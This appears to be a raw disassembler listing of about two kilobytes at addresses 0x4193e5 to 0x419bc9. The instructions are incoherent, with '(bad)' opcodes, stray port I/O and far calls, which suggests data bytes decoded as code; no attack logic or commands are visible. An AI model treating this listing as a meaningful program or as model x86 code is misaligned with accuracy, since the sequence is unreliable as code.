  4193e5:	add    BYTE PTR [eax],al
  4193e7:	rcr    esp,1
  4193e9:	cmp    eax,0x21b0d05f
  4193ee:	push   ecx
  4193ef:	mov    esi,0xb163578a
  4193f4:	cld    
  4193f5:	xor    ebx,DWORD PTR [edi-0x50]
  4193f8:	mov    eax,DWORD PTR [ecx]
  4193fa:	dec    esp
  4193fb:	ret    0x558b
  4193fe:	and    BYTE PTR [eax-0x6aaa73fb],dl
  419404:	pusha  
  419405:	cdq    
  419406:	and    esi,DWORD PTR [ebx+0x63579956]
  41940c:	cmp    DWORD PTR [eax-0x65da70ac],ecx
  419412:	data16 jno 0x419464
  419415:	test   BYTE PTR [ebp+0x43],dl
  419418:	xor    eax,0x57b5788
  41941d:	fwait
  41941e:	bound  esi,QWORD PTR [edx+0x51]
  419421:	pop    es
  419422:	xor    eax,DWORD PTR [eax+0x53]
  419425:	push   ebp
  419426:	imul   edx,DWORD PTR [ecx+0x25],0x60534d3b
  41942d:	out    0x45,eax
  41942f:	das    
  419430:	xor    eax,0x4f1c3e07
  419435:	push   eax
  419436:	addr16 adc al,0x51
  419439:	inc    esi
  41943a:	push   edx
  41943b:	arpl   WORD PTR [edi],di
  41943d:	adc    esi,DWORD PTR [ebx+eax*4]
  419440:	inc    edx
  419441:	push   ss
  419442:	popa   
  419443:	or     BYTE PTR [ebp+ecx*1+0x68],ah
  419447:	add    BYTE PTR [ebx-0x19],dl
  41944a:	add    BYTE PTR gs:[eax],al
	...
  419459:	add    BYTE PTR [edi],dl
  41945b:	push   ebp
  41945c:	sti    
  41945d:	pop    esp
  41945e:	adc    dl,BYTE PTR [ecx-0x2b]
  419461:	push   edi
  419462:	sti    
  419463:	push   eax
  419464:	out    0x2f,eax
  419466:	and    DWORD PTR [eax+0x3],edx
  419469:	pusha  
  41946a:	add    BYTE PTR [ecx+0x17],dl
  41946d:	push   edx
  41946e:	not    BYTE PTR [ebp-0x33]
  419471:	and    esi,DWORD PTR [edx-0x31a83aaa]
  419477:	fldcw  WORD PTR fs:[eax+0x63]
  41947b:	pop    ss
  41947c:	ret    
  41947d:	fs iret 
  41947f:	add    eax,0x52b36215
  419484:	out    0x32,eax
  419486:	(bad)  
  419487:	pop    edi
  419488:	add    BYTE PTR [ebp-0x3b8dd96b],bh
  41948e:	je     0x4194d3
  419490:	push   eax
  419491:	scas   eax,DWORD PTR es:[edi]
  419492:	push   esp
  419493:	xor    eax,0x59bbab5c
  419498:	ins    BYTE PTR es:[edi],dx
  419499:	mov    WORD PTR [ebp+eiz*1+0x58a59b50],?
  4194a0:	leavew 
  4194a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194a3:	xor    DWORD PTR [eax-0x63],edx
  4194a6:	mov    ds:0x60876726,eax
  4194ab:	xor    al,0x6d
  4194ad:	xchg   DWORD PTR [eax+edx*2+0x294a5b5f],ecx
  4194b4:	inc    edx
  4194b5:	push   esp
  4194b6:	inc    ebx
  4194b7:	pop    ecx
  4194b8:	arpl   WORD PTR [ebp-0x69],bx
  4194bb:	push   ebx
  4194bc:	ins    DWORD PTR es:[edi],dx
  4194bd:	add    BYTE PTR ds:[eax],al
	...
  4194cc:	add    BYTE PTR ds:0x45565125,bh
  4194d2:	push   ecx
  4194d3:	jne    0x41951d
  4194d5:	adc    DWORD PTR [edx+0x5c],esp
  4194d8:	sub    ecx,DWORD PTR [edx]
  4194da:	pop    ecx
  4194db:	ins    BYTE PTR es:[edi],dx
  4194dc:	inc    esp
  4194dd:	or     esi,DWORD PTR ds:0x5f3c1672
  4194e3:	and    BYTE PTR [edi],ah
  4194e5:	pop    ebx
  4194e6:	xor    eax,0x5e032a20
  4194eb:	arpl   di,di
  4194ed:	sub    al,0x29
  4194ef:	dec    ebx
  4194f0:	or     BYTE PTR [esi],bl
  4194f2:	push   edi
  4194f3:	add    BYTE PTR [edx],bl
  4194f5:	adc    al,0x5f
  4194f7:	je     0x4194f7
  4194f9:	pop    es
  4194fa:	push   ebx
  4194fb:	arpl   WORD PTR ds:0xbd463521,cx
  419501:	nop
  419502:	popa   
  419503:	inc    edx
  419504:	aam    0xb4
  419506:	xor    DWORD PTR [ebx-0x23],esp
  419509:	adc    BYTE PTR [ebp+0x72],0xbe
  41950d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41950e:	sub    esp,DWORD PTR [eax]
  419510:	add    BYTE PTR [edi*8+0x59055c4f],cl
  419517:	je     0x419582
  419519:	and    eax,0xc9006f63
  41951e:	arpl   WORD PTR [esi+0x74],sp
  419521:	std    
  419522:	sub    DWORD PTR [edx+0x65],esi
  419525:	(bad)  
  419526:	inc    esi
  419527:	jno    0x419595
  419529:	out    0x2d,al
  41952b:	je     0x41957d
  41952d:	call   0xa80095
	...
  41953e:	add    BYTE PTR [eax],al
  419540:	sub    bh,al
  419542:	push   0x66
  419544:	outs   dx,BYTE PTR ds:[esi]
  419545:	pop    ebx
  419546:	pop    ebp
  419547:	jb     0x419528
  419549:	hlt    
  41954a:	inc    ecx
  41954b:	jne    0x4195b3
  41954d:	fs popa 
  41954f:	je     0x4194eb
  419551:	push   edi
  419552:	imul   ebp,DWORD PTR [edi+0x1c],0xffffffe9
  419556:	inc    ebp
  419557:	push   esp
  419558:	mov    ch,cl
  41955a:	ds ins BYTE PTR es:[edi],dx
  41955c:	and    ebp,DWORD PTR [esi+ebp*2]
  41955f:	je     0x4194e7
  419561:	add    dh,BYTE PTR [eax+0x74]
  419564:	adc    esp,DWORD PTR [edx+0x6e]
  419567:	jae    0x419523
  419569:	cmc    
  41956a:	push   0x66
  41956c:	outs   dx,BYTE PTR ds:[esi]
  41956d:	pop    edx
  41956e:	pop    ebp
  41956f:	jb     0x4195e0
  419571:	cmc    
  419572:	inc    ecx
  419573:	push   eax
  419574:	cmp    al,0xfd
  419576:	dec    edi
  419577:	add    BYTE PTR [esi+0x28],al
  41957a:	outs   dx,DWORD PTR ds:[esi]
  41957b:	je     0x4195c6
  41957d:	sub    al,0x6f
  41957f:	jae    0x4195d4
  419581:	bound  ebp,QWORD PTR [esi+0x46]
  419584:	push   ebx
  419585:	and    eax,0x60490061
  41958a:	je     0x4195f1
  41958c:	imul   ecx,DWORD PTR [ebp+eiz*2+0x72],0x736dff4a
  419594:	cs daa 
  419596:	ins    BYTE PTR es:[edi],dx
  419597:	ins    BYTE PTR es:[edi],dx
  419598:	arpl   WORD PTR [edx+0x5a],si
  41959b:	jb     0x41952f
  41959d:	scas   al,BYTE PTR es:[edi]
  41959e:	sbb    edi,DWORD PTR [eax-0x32]
  4195a1:	fiadd  DWORD PTR [ecx]
  4195a3:	pop    esp
	...
  4195b0:	add    BYTE PTR [eax],al
  4195b2:	add    BYTE PTR [eax-0x488d9d2f],dl
  4195b8:	je     0x4195ef
  4195ba:	push   eax
  4195bb:	arpl   WORD PTR [edx+eiz*2+0x76],bp
  4195bf:	mov    WORD PTR [eax-0x60818ba6],fs
  4195c5:	sbb    esp,DWORD PTR [edx+eax*4-0x5e]
  4195c9:	add    DWORD PTR [eax+0x7a],ecx
  4195cc:	lahf   
  4195cd:	push   ebp
  4195ce:	ins    DWORD PTR es:[edi],dx
  4195cf:	jno    0x419556
  4195d1:	sbb    esp,DWORD PTR [edx+eax*4+0x3a]
  4195d5:	add    DWORD PTR [edi-0x79],ebx
  4195d8:	xchg   edx,eax
  4195d9:	dec    edi
  4195da:	bound  edi,QWORD PTR [eax-0x7c]
  4195dd:	gs pop edi
  4195df:	push   edi
  4195e0:	scas   al,BYTE PTR es:[edi]
  4195e1:	push   edx
  4195e2:	jae    0x41962e
  4195e4:	dec    edi
  4195e5:	push   edi
  4195e6:	cs inc edi
  4195e8:	dec    ebp
  4195e9:	pop    eax
  4195ea:	add    BYTE PTR [edi],ah
  4195ec:	cli    
  4195ed:	push   esp
  4195ee:	jb     0x419631
  4195f0:	pop    ebx
  4195f1:	inc    esi
  4195f2:	push   esp
  4195f3:	adc    ebp,DWORD PTR [esi+0x2456d30]
  4195f9:	push   ebx
  4195fa:	pop    edi
  4195fb:	xor    DWORD PTR [ecx+0x30],ecx
  4195fe:	push   esp
  4195ff:	push   ss
  419600:	and    BYTE PTR [edx+0x6d],ah
  419603:	sbb    eax,0xfa0033fa
  419608:	or     ecx,DWORD PTR [edi+0x74]
  41960b:	add    al,dl
  41960d:	pop    ebp
  41960e:	jo     0x419612
  419610:	ret    0x59
  419613:	adc    BYTE PTR [ebx],dl
  419615:	data16 je 0x419618
	...
  419624:	add    BYTE PTR [eax],al
  419626:	hlt    
  419627:	or     al,0x52
  419629:	arpl   WORD PTR [edi],ax
  41962b:	pop    ds
  41962c:	pop    ebx
  41962d:	je     0x4195f1
  41962f:	add    eax,0x4b9d45c3
  419634:	mov    bl,0x33
  419636:	arpl   WORD PTR [esi-0x27],ax
  419639:	mov    di,0xbd28
  41963d:	push   edi
  41963e:	les    esp,FWORD PTR [ebx+edx*8]
  419641:	xor    BYTE PTR [ecx+esi*1+0x37a203b3],dl
  419648:	int3   
  419649:	shl    BYTE PTR [bp+di],0xb3
  41964d:	pop    edx
  41964e:	mov    esp,0x805baa31
  419653:	es xchg edx,eax
  419655:	add    esi,DWORD PTR [edx-0x71a872ce]
  41965b:	and    al,0x99
  41965d:	data16 lahf 
  41965f:	push   esi
  419660:	xchg   esi,eax
  419661:	push   edi
  419662:	xchg   esp,eax
  419663:	popa   
  419664:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419665:	inc    ebp
  419666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419667:	pop    ecx
  419668:	xchg   edi,eax
  419669:	das    
  41966a:	xchg   esi,eax
  41966b:	xor    eax,0x334e5a73
  419670:	pop    edx
  419671:	add    al,0x33
  419673:	and    al,0x5a
  419675:	push   edi
  419676:	push   esi
  419677:	xor    bl,BYTE PTR [ecx+0x60]
  41967a:	arpl   WORD PTR [eax+0x5a],bx
  41967d:	popa   
  41967e:	xor    DWORD PTR [ebx+0x48],edx
  419681:	pop    ecx
  419682:	inc    eax
  419683:	add    eax,0x39325b2f
  419688:	sub    BYTE PTR [eax+0x0],ah
	...
  419697:	add    BYTE PTR [eax],al
  419699:	xor    DWORD PTR [esi],esi
  41969b:	out    0x35,eax
  41969d:	add    BYTE PTR [eax],dh
  41969f:	push   ss
  4196a0:	push   eax
  4196a1:	add    BYTE PTR [ecx+0x10],cl
  4196a4:	push   esi
  4196a5:	arpl   WORD PTR [ebp+0x6],dx
  4196a8:	push   esi
  4196a9:	syscall 
  4196ab:	pop    ds
  4196ac:	pop    ebx
  4196ad:	repnz cmp BYTE PTR ds:0xe7280865,dh
  4196b4:	xor    edi,esi
  4196b6:	ss add ch,bh
  4196b9:	pusha  
  4196ba:	push   esi
  4196bb:	jno    0x4196c1
  4196bd:	mov    ch,0x33
  4196bf:	pop    edi
  4196c0:	aam    0xc3
  4196c2:	add    eax,0x34b5c850
  4196c7:	jne    0x41968f
  4196c9:	scas   al,BYTE PTR es:[edi]
  4196ca:	sub    DWORD PTR [eax],eax
  4196cc:	mov    eax,ds:0xad743499
  4196d1:	xchg   edi,eax
  4196d2:	aaa    
  4196d3:	dec    esi
  4196d4:	enter  0x268b,0x0
  4196d8:	call   0x3787:0xb6742b89
  4196df:	arpl   bp,ax
  4196e1:	popf   
  4196e2:	xor    BYTE PTR [esi-0x79],ah
  4196e5:	and    DWORD PTR [esi],0x41
  4196e8:	pushf  
  4196e9:	mov    al,0xe5
  4196eb:	push   eax
  4196ec:	jle    0x419670
  4196ee:	cmp    DWORD PTR [ebp-0x78],esi
  4196f1:	mov    fs,WORD PTR [esi]
  4196f3:	pop    esp
  4196f4:	mov    al,0x8a
  4196f6:	cmp    DWORD PTR [ebx+0x7b],esp
  4196f9:	mov    ah,BYTE PTR [esi]
  4196fb:	je     0x41968a
	...
  419709:	add    BYTE PTR [eax],al
  41970b:	add    BYTE PTR [eax+0x364f6d37],dl
  419711:	xor    DWORD PTR [ebx+0x5a],esp
  419714:	addr16 push esp
  419716:	ins    DWORD PTR es:[edi],dx
  419717:	dec    edi
  419718:	xor    edi,DWORD PTR [eax]
  41971a:	pop    edi
  41971b:	pop    ebx
  41971c:	inc    edx
  41971d:	popa   
  41971e:	inc    esi
  41971f:	sbb    eax,0x3b5f586f
  419724:	inc    edx
  419725:	popa   
  419726:	inc    ecx
  419727:	es ins DWORD PTR es:[edi],dx
  419729:	inc    esi
  41972a:	inc    esi
  41972b:	adc    eax,0x10516157
  419730:	xor    esp,DWORD PTR [esi]
  419732:	jno    0x41971d
  419734:	dec    eax
  419735:	xor    BYTE PTR [ecx+0x1d],dh
  419738:	pop    edi
  419739:	push   esi
  41973a:	jno    0x419740
  41973c:	adc    eax,0x4d005005
  419741:	pop    ebx
  419742:	je     0x419744
  419744:	dec    edx
  419745:	idiv   bh
  419747:	dec    edi
  419748:	pop    bp
  41974a:	push   edx
  41974b:	add    BYTE PTR [ecx-0x8],bh
  41974e:	inc    edi
  41974f:	add    BYTE PTR [edx],bh
  419751:	pop    ebx
  419752:	imul   esp,DWORD PTR [esi+0x33],0x59
  419756:	popa   
  419757:	jae    0x4197b5
  419759:	push   ecx
  41975a:	imul   ebp,DWORD PTR [edx+ecx*2-0x17],0xe4da5445
  419762:	inc    eax
  419763:	js     0x41974f
  419765:	pop    eax
  419766:	imul   esi,DWORD PTR [edx+0x17],0x5b
  41976a:	add    BYTE PTR [ebx-0x23],dl
  41976d:	es je  0x4197e7
	...
  41977c:	add    BYTE PTR [eax],al
  41977e:	add    bl,ch
  419780:	pop    edx
  419781:	popa   
  419782:	pop    esp
  419783:	(bad)  
  419784:	lock dec edi
  419786:	and    BYTE PTR [edi+0x7d6c704c],dh
  41978c:	pop    edx
  41978d:	popa   
  41978e:	jb     0x41974e
  419790:	inc    esi
  419791:	push   esp
  419792:	push   eax
  419793:	sbb    al,BYTE PTR [esi+0x78]
  419796:	jo     0x419776
  419798:	pop    ebx
  419799:	jb     0x419800
  41979b:	pop    eax
  41979c:	call   0x627a06f3
  4197a1:	outs   dx,DWORD PTR ds:[esi]
  4197a2:	jo     0x4197bf
  4197a4:	sub    ah,BYTE PTR [ecx+0x5c]
  4197a7:	jg     0x4197ec
  4197a9:	aas    
  4197aa:	push   esp
  4197ab:	jge    0x41980b
  4197ad:	ins    BYTE PTR es:[edi],dx
  4197ae:	inc    edx
  4197af:	sub    edx,DWORD PTR [edi+0x29]
  4197b2:	xor    ch,BYTE PTR [eax+0x67420010]
  4197b8:	push   ebp
  4197b9:	je     0x41982a
  4197bb:	pop    esp
  4197bc:	pop    edx
  4197bd:	add    BYTE PTR [ebx+0x6d],dl
  4197c0:	and    esi,DWORD PTR [edi+esi*2+0x5b]
  4197c4:	push   edi
  4197c5:	popa   
  4197c6:	pop    esp
  4197c7:	arpl   ax,si
  4197c9:	das    
  4197ca:	push   eax
  4197cb:	inc    ebx
  4197cc:	jmp    0x1749081c
  4197d1:	push   esi
  4197d2:	arpl   cx,si
  4197d4:	and    DWORD PTR [edx+esi*2],esi
  4197d7:	hlt    
  4197d8:	mulps  xmm5,XMMWORD PTR [esi+eax*8-0x45]
  4197dd:	add    DWORD PTR [eax-0x3e],edx
  4197e0:	fist   DWORD PTR [ebp+esi*2+0x0]
	...
  4197f0:	add    BYTE PTR [eax],al
  4197f2:	mov    esp,0xb3005ddc
  4197f7:	int    0x54
  4197f9:	jno    0x4197af
  4197fb:	jg     0x419850
  4197fd:	fs pop ebp
  419800:	push   ecx
  419801:	arpl   WORD PTR [ebx+0x76],sp
  419804:	pop    eax
  419805:	jno    0x4197b6
  419807:	scas   al,BYTE PTR es:[edi]
  419808:	xor    eax,0x57c5846d
  41980d:	add    BYTE PTR [ebx+0x63745397],dh
  419813:	jne    0x41986c
  419815:	pop    DWORD PTR [di+0x6c62]
  41981a:	xchg   ebx,eax
  41981b:	lea    ecx,[ebp+0x68]
  41981e:	arpl   WORD PTR [eax+0x4d],si
  419821:	jo     0x4197b3
  419823:	xchg   ebp,eax
  419824:	dec    ebp
  419825:	arpl   WORD PTR ds:0x636c5636,si
  41982b:	xchg   edx,eax
  41982c:	aas    
  41982d:	jb     0x419879
  41982f:	dec    edi
  419830:	popa   
  419831:	je     0x419879
  419833:	sbb    eax,DWORD PTR [esi+ebp*1]
  419836:	cmp    cl,BYTE PTR [eax+0x59]
  419839:	add    BYTE PTR [edi],bl
  41983b:	clc    
  41983c:	pusha  
  41983d:	outs   dx,BYTE PTR ds:[esi]
  41983e:	pop    ds
  41983f:	inc    ebp
  419840:	pop    ebx
  419841:	arpl   WORD PTR [edi],cx
  419843:	jmp    0x41989b
  419845:	outs   dx,BYTE PTR ds:[esi]
  419846:	cmp    eax,0x305c5f45
  41984b:	dec    ecx
  41984c:	push   ebx
  41984d:	jno    0x419859
  41984f:	add    eax,0x5125a16
  419854:	cmp    esi,DWORD PTR ds:0x0
	...
  419866:	xor    al,0x1a
  419868:	pop    ebx
  419869:	push   cs
  41986a:	das    
  41986b:	sbb    al,BYTE PTR [edx+edx*1]
  41986e:	xor    BYTE PTR ds:0xf925f650,cl
  419874:	pop    esi
  419875:	pop    es
  419876:	push   edi
  419877:	or     BYTE PTR [edx-0x59],bl
  41987a:	cmp    al,0x2
  41987c:	pop    edi
  41987d:	mov    bh,0x52
  41987f:	int3   
  419880:	shl    BYTE PTR fs:[ebx],1
  419883:	les    eax,FWORD PTR [ecx-0x55]
  419886:	add    eax,0x27cd58aa
  41988b:	shl    BYTE PTR [eax-0x7d],0x55
  41988f:	enter  0xbb4f,0x5
  419893:	xchg   esp,eax
  419894:	push   edi
  419895:	scas   eax,DWORD PTR es:[edi]
  419896:	xor    ecx,eax
  419898:	inc    ecx
  419899:	mov    ebx,0x9227e755
  41989e:	sub    al,0x9b
  4198a0:	pop    esi
  4198a1:	xchg   edx,eax
  4198a2:	out    dx,eax
  4198a3:	sahf   
  4198a4:	push   esi
  4198a5:	ja     0x4198ac
  4198a7:	mov    bl,0x41
  4198a9:	xchg   edi,eax
  4198aa:	push   ebp
  4198ab:	mov    ecx,0xe72d724e
  4198b0:	xor    eax,0x348f3270
  4198b5:	jl     0x4198f0
  4198b7:	mov    WORD PTR [ecx],ds
  4198b9:	pop    ebx
  4198ba:	xor    BYTE PTR [ebx+0x3],bh
  4198bd:	xor    ch,BYTE PTR [eax]
  4198bf:	pop    ecx
  4198c0:	dec    esi
  4198c1:	inc    eax
  4198c2:	xor    esp,edi
  4198c4:	xor    BYTE PTR [edx+0x28],dl
  4198c7:	pop    ecx
  4198c8:	push   esi
	...
  4198d5:	add    BYTE PTR [eax],al
  4198d7:	add    BYTE PTR [eax+esi*1],bl
  4198da:	inc    esp
  4198db:	add    al,0x13
  4198dd:	and    al,0x3a
  4198df:	push   ebx
  4198e0:	ss cmp DWORD PTR cs:[eax+0x63],esp
  4198e5:	inc    edi
  4198e6:	add    BYTE PTR ds:0x3b6d5537,bh
  4198ec:	xor    eax,DWORD PTR ds:0x392d1651
  4198f2:	jne    0x4198fc
  4198f4:	xor    DWORD PTR [edx],esp
  4198f6:	pop    esp
  4198f7:	sub    dl,BYTE PTR [ecx]
  4198f9:	arpl   WORD PTR ss:[ebx],bx
  4198fc:	dec    ebx
  4198fd:	pop    eax
  4198fe:	arpl   WORD PTR [ebx],cx
  419900:	xor    BYTE PTR [esi],ah
  419902:	je     0x419908
  419904:	das    
  419905:	xor    ah,BYTE PTR [edx+0x5]
  419908:	mov    esi,0xb1046834
  41990d:	add    eax,0x39afab5c
  419912:	dec    ecx
  419913:	shr    BYTE PTR [esi-0x3d1687de],1
  419919:	es je  0x4198de
  41991c:	xchg   edi,eax
  41991d:	das    
  41991e:	arpl   cx,ax
  419920:	push   esi
  419921:	sub    DWORD PTR [ecx-0x17],esi
  419924:	push   0xb6bd7130
  419929:	pop    esi
  41992a:	imul   eax,esp,0x60
  41992d:	push   edx
  41992e:	jno    0x4198bc
  419930:	mov    dl,0x2f
  419932:	pop    edi
  419933:	mov    WORD PTR [ebx-0x6e77affb],es
  419939:	xor    al,0x75
  41993b:	jle    0x41993d
	...
  419949:	add    BYTE PTR [eax],al
  41994b:	xchg   edx,eax
  41994c:	sub    DWORD PTR [eax],eax
  41994e:	cdq    
  41994f:	xchg   ebp,eax
  419950:	xor    esi,DWORD PTR [ecx+ebp*8+0x31]
  419954:	xor    BYTE PTR [esi+0x7d],ah
  419957:	sub    eax,0x7c84725e
  41995c:	inc    edx
  41995d:	js     0x4199b8
  41995f:	inc    esi
  419960:	das    
  419961:	inc    esp
  419962:	pop    ebx
  419963:	es aaa 
  419965:	arpl   WORD PTR ds:0x5a712270,si
  41996b:	push   ss
  41996c:	xor    BYTE PTR [esi+0x0],ch
  41996f:	imul   ecx,DWORD PTR [ecx],0x5922455c
  419975:	pop    ebp
  419976:	outs   dx,BYTE PTR ds:[esi]
  419977:	dec    esi
  419978:	push   ebx
  419979:	gs jbe 0x41999b
  41997c:	or     DWORD PTR [esp+eiz*2+0x68],ebx
  419980:	pusha  
  419981:	jbe    0x4199e8
  419983:	imul   edx,DWORD PTR [edi],0xe38a736a
  419989:	outs   dx,DWORD PTR ds:[esi]
  41998a:	popa   
  41998b:	pop    ecx
  41998c:	push   edx
  41998d:	jae    0x4199fe
  41998f:	push   0xa020225d
  419994:	loope  0x4199b7
  419996:	add    BYTE PTR [eax],ch
  419998:	adc    eax,0x5b555300
  41999d:	je     0x419a16
  41999f:	sbb    edx,DWORD PTR [edi+0x61]
  4199a2:	pop    esp
  4199a3:	call   DWORD PTR [eax+0x70]
  4199a6:	popa   
  4199a7:	and    al,0xfd
  4199a9:	jno    0x419a14
  4199ab:	or     al,0x26
  4199ad:	add    BYTE PTR [ebp+0x0],al
	...
  4199bc:	add    BYTE PTR [eax],al
  4199be:	and    bl,BYTE PTR [ecx+0x5d]
  4199c1:	outs   dx,BYTE PTR ds:[esi]
  4199c2:	(bad)  
  4199c3:	push   esi
  4199c4:	gs jbe 0x4199f6
  4199c7:	in     al,0x47
  4199c9:	outs   dx,DWORD PTR ds:[esi]
  4199ca:	xlat   BYTE PTR ds:[ebx]
  4199cb:	and    eax,0x56df5300
  4199d0:	jbe    0x419a37
  4199d2:	call   0xefb4eadf
  4199d7:	push   esi
  4199d8:	dec    esi
  4199d9:	popa   
  4199da:	ja     0x419a01
  4199dc:	add    BYTE PTR [eax-0x25],dl
  4199df:	push   edi
  4199e0:	outs   dx,DWORD PTR ds:[esi]
  4199e1:	ja     0x4199b8
  4199e3:	push   esi
  4199e4:	fs add ch,dh
  4199e7:	clc    
  4199e8:	pop    esp
  4199e9:	jae    0x419a44
  4199eb:	dec    ebx
  4199ec:	imul   esi,DWORD PTR [edx+0x1e],0x1
  4199f0:	inc    esp
  4199f1:	imul   ebp,DWORD PTR [eax],0x63745f5c
  4199f7:	inc    ebx
  4199f8:	push   edx
  4199f9:	ja     0x419a5e
  4199fb:	call   DWORD PTR [edx+0x66]
  4199fe:	aaa    
  4199ff:	sti    
  419a00:	pusha  
  419a01:	jb     0x419a41
  419a03:	sbb    dh,BYTE PTR [esi]
  419a05:	inc    ecx
  419a06:	sub    ecx,DWORD PTR [esi]
  419a08:	das    
  419a09:	ins    DWORD PTR es:[edi],dx
  419a0a:	std    
  419a0b:	icebp  
  419a0c:	dec    edx
  419a0d:	pop    edi
  419a0e:	adc    DWORD PTR [ecx],ecx
  419a10:	sub    BYTE PTR [ecx-0x9],al
  419a13:	or     al,0x4f
  419a15:	jno    0x419a21
  419a17:	(bad)  
  419a19:	push   esp
  419a1a:	adc    ebp,edx
  419a1c:	cmp    eax,0x5eed1354
  419a21:	popa   
	...
  419a2e:	add    BYTE PTR [eax],al
  419a30:	add    ah,dh
  419a32:	mov    al,0x53
  419a34:	je     0x419a06
  419a36:	scas   al,BYTE PTR es:[edi]
  419a37:	cmp    esi,DWORD PTR [ebx+edx*8+0x1f]
  419a3b:	pop    ebp
  419a3c:	jb     0x419a13
  419a3e:	leave  
  419a3f:	dec    edi
  419a40:	add    BYTE PTR [ebp-0x4facae2e],bl
  419a46:	leave  
  419a47:	dec    edi
  419a48:	dec    esi
  419a49:	ret    0x5e79
  419a4c:	add    BYTE PTR [ebp-0x3dafae86],ah
  419a52:	jg     0x419aa4
  419a54:	jne    0x4199e2
  419a56:	sbb    BYTE PTR [ebp+0x0],0xb4
  419a5a:	fs dec ebp
  419a5c:	jo     0x419a11
  419a5e:	lea    edx,[eax+0x71]
  419a61:	mov    WORD PTR [ebx+0x6c63644f],cs
  419a67:	dec    ebp
  419a68:	jo     0x419a09
  419a6a:	test   DWORD PTR [edi+0x63],ecx
  419a6d:	cmp    BYTE PTR [edx],0x54
  419a70:	jb     0x419adc
  419a72:	scas   al,BYTE PTR es:[edi]
  419a73:	xor    BYTE PTR [ebp+0x25],cl
  419a76:	call   0x4e25:0x61313f2c
  419a7d:	and    BYTE PTR ds:0x2c32242f,al
  419a83:	inc    ebp
  419a84:	push   eax
  419a85:	ss es pop ecx
  419a88:	pop    edi
  419a89:	pop    ss
  419a8a:	inc    ebx
  419a8b:	cmp    ebx,DWORD PTR [ebx+0x3d]
  419a8e:	and    al,0x23
  419a90:	inc    ebx
  419a91:	inc    edx
  419a92:	sub    BYTE PTR [esi+0x4f],cl
	...
  419aa1:	add    BYTE PTR [eax],al
  419aa3:	add    BYTE PTR ds:0x32043a31,cl
  419aa9:	sub    al,0x45
  419aab:	push   eax
  419aac:	push   ss
  419aad:	sbb    DWORD PTR es:[edi+0x27],ebx
  419ab1:	inc    ebx
  419ab2:	xor    esi,DWORD PTR [edx+eiz*1]
  419ab5:	sub    DWORD PTR [eax],eax
  419ab7:	pop    edi
  419ab8:	add    eax,0x4312b31
  419abd:	xor    DWORD PTR [ecx+edx*2],ecx
  419ac0:	arpl   WORD PTR [eax+0xe],bx
  419ac3:	pop    esi
  419ac4:	xlat   BYTE PTR ds:[ebx]
  419ac5:	xor    cl,BYTE PTR [eax]
  419ac7:	push   edx
  419ac8:	rcr    BYTE PTR [ecx+0x1a],0x55
  419acc:	lds    esi,FWORD PTR [ecx]
  419ace:	mov    edi,0xc637b615
  419ad3:	daa    
  419ad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ad5:	push   ecx
  419ad6:	mov    bh,0x40
  419ad8:	(bad)  
  419ad9:	sub    al,0xc4
  419adb:	push   ebp
  419adc:	mov    bh,0x59
  419ade:	call   0x4d03:0xba20af5a
  419ae5:	sub    ch,BYTE PTR [edi-0x42149ca0]
  419aeb:	push   edi
  419aec:	jg     0x419af3
  419aee:	ret    
  419aef:	cmp    al,0xb3
  419af1:	push   esi
  419af2:	mov    ds,WORD PTR [ebp+0x77]
  419af5:	xor    cl,BYTE PTR [eax-0x5ca67faf]
  419afb:	pop    edx
  419afc:	jno    0x419b1e
  419afe:	mov    cl,BYTE PTR [edi+0x76]
  419b01:	aaa    
  419b02:	and    BYTE PTR [ebx],0x2e
  419b05:	xor    eax,0x7c00
	...
  419b16:	add    BYTE PTR [ebx],dh
  419b18:	add    eax,0x5a289a5c
  419b1d:	jb     0x419b6b
  419b1f:	jnp    0x419b75
  419b21:	arpl   WORD PTR [ebp+0x7b],dx
  419b24:	and    ch,BYTE PTR [esi+0x4e]
  419b27:	ins    BYTE PTR es:[edi],dx
  419b28:	jmp    0x419b8a
  419b2a:	dec    edx
  419b2b:	je     0x419b32
  419b2d:	pop    esp
  419b2e:	sbb    dh,BYTE PTR [edi+0x5a]
  419b31:	jb     0x419b77
  419b33:	dec    ebx
  419b34:	push   esp
  419b35:	arpl   WORD PTR ds:0x466e225b,di
  419b3b:	push   esp
  419b3c:	pop    eax
  419b3d:	das    
  419b3e:	inc    esi
  419b3f:	(bad)  
  419b40:	pop    ecx
  419b41:	xor    ecx,edi
  419b43:	inc    ebp
  419b44:	and    al,0x71
  419b46:	jmp    0x8a9ef5f
  419b4b:	xor    eax,0x3a1a6426
  419b50:	xor    DWORD PTR [eax+edx*1-0x6f],esi
  419b54:	and    BYTE PTR [ecx-0x39],dh
  419b57:	lea    ebp,[edx]
  419b59:	ins    BYTE PTR es:[edi],dx
  419b5a:	add    BYTE PTR [ebx-0x523affda],cl
  419b60:	sub    eax,0x218bdb5f
  419b65:	push   ecx
  419b66:	int3   
  419b67:	ins    BYTE PTR es:[edi],dx
  419b68:	xor    DWORD PTR [edi-0x41],esp
  419b6b:	jns    0x419ba1
  419b6d:	pop    ebp
  419b6e:	clc    
  419b6f:	shl    ebp,0x5c
  419b72:	hlt    
  419b73:	adc    dh,BYTE PTR ds:0x3147c56f
  419b79:	arpl   cx,bp
	...
  419b87:	add    BYTE PTR [eax],al
  419b89:	add    BYTE PTR [esp+eax*2+0x263a8f6d],ch
  419b90:	arpl   WORD PTR [edx-0x45dfcac5],bp
  419b96:	xor    DWORD PTR [ebx],esp
  419b98:	je     0x419b30
  419b9a:	inc    edi
  419b9b:	aaa    
  419b9c:	arpl   WORD PTR [eax],ax
  419b9e:	cli    
  419b9f:	jmp    0xec9bfd04
  419ba4:	jae    0x419c16
  419ba6:	retf   0x6dfc
  419ba9:	ins    BYTE PTR es:[edi],dx
  419baa:	out    0xe0,eax
  419bac:	outs   dx,DWORD PTR ds:[esi]
  419bad:	cs pop ss
  419baf:	stc    
  419bb0:	pusha  
  419bb1:	add    BYTE PTR [ecx],bl
  419bb3:	call   0xb75b012b
  419bb8:	popa   
  419bb9:	popa   
  419bba:	push   ss
  419bbb:	add    DWORD PTR [edi+0x69],ebp
  419bbe:	data16 in al,dx
  419bc0:	outs   dx,BYTE PTR ds:[esi]
  419bc1:	cs xor esi,edi
  419bc4:	add    BYTE PTR fs:[esi+0x55],ch
  419bc8:	popa   
  419bc9:	popa   
